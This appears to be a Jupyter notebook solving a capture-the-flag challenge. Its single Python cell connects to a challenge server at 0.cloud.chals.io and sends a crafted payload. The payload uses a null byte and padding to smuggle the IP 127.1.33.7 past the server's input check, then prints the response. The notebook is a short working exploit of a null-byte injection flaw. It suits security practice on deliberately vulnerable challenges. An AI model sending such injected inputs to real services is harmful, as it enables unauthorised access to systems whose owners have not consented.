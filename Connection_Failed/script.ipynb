{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket            \n",
    " \n",
    "# Create a socket object\n",
    "s = socket.socket()        \n",
    " \n",
    "# Define the port on which you want to connect\n",
    "port = 24939               \n",
    "host=\"0.cloud.chals.io\"\n",
    "\n",
    "# connect to the server on local computer\n",
    "s.connect((host, port))  \n",
    "\n",
    "# 127.1.33.7 server ip\n",
    "exploit=\"aaaaaa127.1.33.7\"\n",
    "message=f\"YES\\x00{exploit}\\n\"\n",
    "s.send(message.encode())\n",
    "\n",
    "# receive data from the server and decoding to get the string.\n",
    "print (s.recv(1024).decode())\n",
    "\n",
    "# close the connection\n",
    "s.close()"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
